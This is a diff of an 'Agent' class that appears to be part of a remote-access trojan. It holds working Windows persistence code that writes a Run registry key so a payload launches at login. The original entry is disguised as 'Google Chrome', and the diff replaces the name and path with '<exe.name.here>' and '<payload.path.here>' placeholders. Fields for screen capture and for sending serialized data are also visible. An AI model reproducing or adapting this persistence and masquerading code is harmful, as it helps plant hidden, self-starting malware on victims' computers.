@@ -74,7 +74,7 @@ class Agent:
                 import winreg
                 HKCU = winreg.HKEY_CURRENT_USER
                 startup = winreg.OpenKeyEx(HKCU, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(startup, "Google Chrome", 0, winreg.REG_SZ, "C:\Program Files (x86)\Google\Chrome\chrome.exe")
+                winreg.SetValueEx(startup, "<exe.name.here>", 0, winreg.REG_SZ, "<payload.path.here>")
                 winreg.CloseKey(startup)
             except Exception as e:
                 print(e)
@@ -118,7 +118,7 @@ class Agent:
         self.frames = []
         self.scrc = False
         self.scrThread = None
-        self.script_path = "C:\Program Files (x86)\Google\Chrome\chrome.exe"
+        self.script_path = "<payload.path.here>"
   
 
     def serialize_send(self, data):
